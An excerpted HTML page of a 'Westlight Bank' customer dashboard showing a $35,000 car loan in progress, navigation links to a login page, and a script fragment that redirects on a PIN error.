...
<head>
    ...
    <title>Loan Transaction - Westlight Bank </title>
...
<a href="https://westlightbank.site/" class="log"><img src="../images/log.png" class="navbar-logo" alt="logo" width="25%" style="margin-top:10px; margin-bottom: 10px; margin-left: 10px;"></a>
                                    ...
                                    <div class="media">
                                        <div class="user-img">
                                            <div class="avatar avatar-xl">
                                                <img src="../assets/profile/DemoIMG_0024.jpg" width="100%" alt=""
                                                    style="border-radius: 50%">
                                            </div>
                                        </div>
                                        <div class="media-body">
                                            <div class="">
                                                <h5 class="usr-name text-info text-uppercase"><span class="text-primary">LOAN In Progress!</span></h5>
                                                <p class="msg-title text-danger">$35000</p>
                                            </div>
                                        </div>
                                    </div>
                            ...
                            <div class="dropdown-item">
                                <div class="media ">
                                    ...
                                    <div class="media-body">
                                        ...
                                        <div class="icon-status">
                                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-x-circle text-danger"><circle cx="12" cy="12" r="10"></circle><line x1="15" y1="9" x2="9" y2="15"></line><line x1="9" y1="9" x2="15" y2="15"></line></svg>                                        </div>
                                    </div>
                                </div>
                            </div>
                    ...
                    <div class="dropdown-menu position-absolute" aria-labelledby="userProfileDropdown">
                        <div class="user-profile-section">
                            <div class="media mx-auto">
                                <img src="../assets/profile/DemoIMG_0024.jpg" class="img-fluid mr-2" alt="avatar">
                                <div class="media-body">
                        ...
                        <div class="dropdown-item">
                            <a href="https://westlightbank.site/login.php">
                                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
                                    fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
        ...
        <div class="sidebar-wrapper sidebar-theme">
            ...
            <nav id="sidebar">
                ...
                <ul class="list-unstyled menu-categories" id="accordionExample">
                    ...
                    <li class="menu ">
                        <a href="https://westlightbank.site/login.php" aria-expanded="false" class="dropdown-toggle">
                            <div class="">
                                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
                                    fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                    ...
                    <li class="menu">
                        ...
                        <ul class="collapse submenu list-unstyled" id="starkit" data-parent="#accordionExample">
                            <li>
                                <a href="https://westlightbank.site/login.php"> Credit / Debit Transaction </a>
                            </li>
                            <li>
                                <a href="https://westlightbank.site/login.php"> Wire Transaction </a>
                            </li>
                            <li>
                                <a href="https://westlightbank.site/login.php"> Domestic Transaction </a>
                            </li>
                            <li>
                                <a href="loan-transaction.html"> Loan Transaction </a>
                            </li>
                            <li>
                                <a href="https://westlightbank.site/login.php"> All Withdrawal</a>
                            </li>
                    ...
                    <li class="menu">
                        ...
                        <ul class="collapse submenu list-unstyled" id="starter-kit" data-parent="#accordionExample">
                            ...
                            <li>
                                <a href="https://westlightbank.site/login.php"> Account </a>
                            </li>
                        </ul>
                    </li>
        ...
        <div class="widget-content widget-content-area br-6">
            <table id="default-ordering" class="table table-hover" style="width:100%">
                ...
                <tbody>
                        ...
                        <td>$35000</td>
                        <td>Car load</td>
                        <td><span class="badge outline-badge-secondary shadow-none col-12">In Progress</span></td>
                        <td class="text-center"><a href="https://westlightbank.site/login.php" class="btn btn-primary btn-sm">View</a> </td>
                    </tr>
                                    </tbody>
                <tfoot>
                <tr>
...
<div class="footer-wrapper">
    <div class="footer-section f-section-1">
        <p class="">Copyright © 2021 Westlight Bank, All rights reserved.</p>
    </div>
    <div class="footer-section f-section-2">
        <p class="">Westlight Bank </p>
    </div>
</div>
</div>
<!--  END CONTENT AREA  -->
...
<script>
    ...
    var targetdestination="www.westlightbank.site/user/success.html"
        ...
        $.ajax({
            ...
            success : function(response){
                if(response === "error_pin"){
                    ...
                    var url = 'https://westlightbank.site/login.php'
